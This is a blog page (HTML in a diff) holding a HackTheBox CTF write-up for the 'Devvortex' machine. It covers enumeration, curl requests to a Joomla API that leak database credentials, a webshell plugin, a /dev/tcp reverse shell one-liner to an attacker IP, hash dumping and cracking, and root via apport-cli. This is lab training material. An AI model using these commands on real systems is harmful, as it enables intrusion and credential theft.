@@ -1,0 +1,300 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Devvortex Devvortex is an &#34;Easy&#34; unix box. Enumeration &amp; Fingerprinting &gt; sudo nmap -sC -sV -oN devvortex.nmap 10.10.11.242 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) ... 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Devvortex"/>
+  <meta property="og:description" content="Devvortex Devvortex is an &#34;Easy&#34; unix box. Enumeration &amp; Fingerprinting &gt; sudo nmap -sC -sV -oN devvortex.nmap 10.10.11.242 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) ... 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/devvortex.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-01-11 18:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Devvortex</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+      <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick="loadStorkIndex()"/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/devvortex">CTF: HackTheBox Devvortex</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#devvortex" title="Devvortex">Devvortex</a><ul><li><a class="toc-href" href="#enumeration-fingerprinting" title="Enumeration &amp; Fingerprinting">Enumeration &amp; Fingerprinting</a></li><li><a class="toc-href" href="#foothold" title="Foothold">Foothold</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></li></ul></div>
+        </div>
+    <h2 id="devvortex">Devvortex</h2>
+<p>Devvortex is an "Easy" unix box.</p>
+<h3 id="enumeration-fingerprinting">Enumeration &amp; Fingerprinting</h3>
+<blockquote>
+<p>&gt; sudo nmap -sC -sV -oN devvortex.nmap 10.10.11.242<br/>
+...<br/>
+PORT   STATE SERVICE VERSION<br/>
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br/>
+...<br/>
+80/tcp open  http    nginx 1.18.0 (Ubuntu)<br/>
+|_http-title: Did not follow redirect to http://devvortex.htb/ 
+|_http-server-header: nginx/1.18.0 (Ubuntu)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  </p>
+</blockquote>
+<p>Ports open are 22 and 80 ; the "devvortex.htb" domain is added to /etc/hosts.</p>
+<p>A corporate landing page is presented:</p>
+<p>Some subdomain fuzzing is performed:</p>
+<blockquote>
+<p>&gt; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.devvortex.htb" -u  http://10.10.11.242 -fs 15<br/>
+...<br/>
+dev &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 108ms]</p>
+</blockquote>
+<p>A "dev.devvortex.htb" subdomain is found and added to /etc/hosts. The dev.devvortex.htb virtualhost presents the following index page:</p>
+<p>Directory bruteforce is performed on the sudomain:</p>
+<blockquote>
+<p>&gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://dev.devvortex.htb<br/>
+...<br/>
+/cache                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cache/]<br/>
+/language             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/language/]<br/>
+/templates            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/templates/]<br/>
+/images               (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/images/]<br/>
+/media                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/media/]<br/>
+/modules              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/modules/]<br/>
+/includes             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/includes/]<br/>
+/tmp                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/tmp/]<br/>
+/components           (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/components/]<br/>
+/plugins              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/plugins/]<br/>
+/administrator        (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/administrator/]<br/>
+/libraries            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/libraries/]<br/>
+/api                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/api/]<br/>
+/home                 (Status: 200) [Size: 23221]  </p>
+</blockquote>
+<p>Interacting with the "api" endpoint reveals that the server is running Joomla!:</p>
+<p>Joomla! version can be found at:</p>
+<blockquote>
+<p>http://dev.devvortex.htb/administrator/manifests/files/joomla.xml</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nt">&lt;name&gt;</span>files_joomla<span class="nt">&lt;/name&gt;</span>
+<span class="w">    </span><span class="nt">&lt;author&gt;</span>Joomla!<span class="w"> </span>Project<span class="nt">&lt;/author&gt;</span>
+<span class="w">    </span><span class="nt">&lt;authorEmail&gt;</span>admin@joomla.org<span class="nt">&lt;/authorEmail&gt;</span>
+<span class="w">    </span><span class="nt">&lt;authorUrl&gt;</span>www.joomla.org<span class="nt">&lt;/authorUrl&gt;</span>
+<span class="w">    </span><span class="nt">&lt;copyright&gt;</span>(C)<span class="w"> </span>2019<span class="w"> </span>Open<span class="w"> </span>Source<span class="w"> </span>Matters,<span class="w"> </span>Inc.<span class="nt">&lt;/copyright&gt;</span>
+<span class="w">    </span><span class="nt">&lt;license&gt;</span>GNU<span class="w"> </span>General<span class="w"> </span>Public<span class="w"> </span>License<span class="w"> </span>version<span class="w"> </span>2<span class="w"> </span>or<span class="w"> </span>later;<span class="w"> </span>see<span class="w"> </span>LICENSE.txt<span class="nt">&lt;/license&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>4.2.6<span class="nt">&lt;/version&gt;</span>
+</code></pre></div>
+<p>This Joomla! version appears to be vulnerable to some authentication bypass, allowing an unauthenticated attacker to access to privileged information such as configuration file an database content - <a href="https://vulncheck.com/blog/joomla-for-rce">see there </a></p>
+<p>Database credentials are leaked:</p>
+<blockquote>
+<p>&gt; curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq .</p>
+</blockquote>
+<p><img alt="joomla-database-credentials-exfiltration.png" src="http://localhost:1337/images/ctf/htb/machines/devvortex/joomla-database-credentials-exfiltration.png"/></p>
+<blockquote>
+<p>lewis : P4ntherg0t1n5r3c0n##</p>
+</blockquote>
+<p>Also users information are leakable by requesting:</p>
+<blockquote>
+<p>&gt; curl -s 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq .</p>
+</blockquote>
+<p><img alt="joomla-usernames-exfiltration.png" src="http://localhost:1337/images/ctf/htb/machines/devvortex/joomla-usernames-exfiltration.png"/></p>
+<h3 id="foothold">Foothold</h3>
+<p>Leaked credentials are used to access Joomla! administrative panel:</p>
+<p><img alt="joomla-administration-panel.png" src="http://localhost:1337/images/ctf/htb/machines/devvortex/joomla-administration-panel.png"/></p>
+<p>Injecting PHP code into theme pages does not work since the user running the application has no rights to write the file. Anyway, it's possible to install modules and plugins.</p>
+<p>The <a href="https://github.com/p0dalirius/Joomla-webshell-plugin">Joomla Webshell Plugin</a>is installed in order to obtain an interactive reverse shell, running:</p>
+<blockquote>
+<p>&gt; python console.py -t http://dev.devvortex.htb<br/>
+&gt;&gt; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.247/8090 0&gt;&amp;1'  </p>
+</blockquote>
+<p>The user running the application is:</p>
+<blockquote>
+<p>www-data </p>
+</blockquote>
+<p>Joomla! users password hashes are obtained from the database:</p>
+<blockquote>
+<p>&gt; mysql&gt; select username, password from sd4fg_users;<br/>
++----------+--------------------------------------------------------------+  <br/>
+| username | password &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|  <br/>
++----------+--------------------------------------------------------------+  <br/>
+| lewis &nbsp;&nbsp;&nbsp;| $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |  <br/>
+| logan &nbsp;&nbsp;&nbsp;| $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |  <br/>
++----------+--------------------------------------------------------------+  </p>
+</blockquote>
+<p>The following hash i cracked with hashcat:</p>
+<blockquote>
+<p>&gt; hashcat -m 3200 hashes.txt /usr/share/dict/rockyou.txt
+...<br/>
+$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho</p>
+</blockquote>
+<p>Recovered password is used to ssh as logan user.</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>User "logan" has some sudo privileges:</p>
+<blockquote>
+<p>sudo -l <br/>
+...<br/>
+&nbsp;(ALL : ALL) /usr/bin/apport-cli
+&nbsp;
+The program "apport-cli" has a known vulnerability <a href="https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00">CVE 2023-1326</a> which allows to open a "less" editor instance and therefore allowing to run command as root when apport-cli is launched with sudo permissions.</p>
+</blockquote>
+<p>A bash shell as root is opened:</p>
+<p><img alt="devvorted-root.png" src="http://localhost:1337/images/ctf/htb/machines/devvortex/devvorted-root.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2024 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
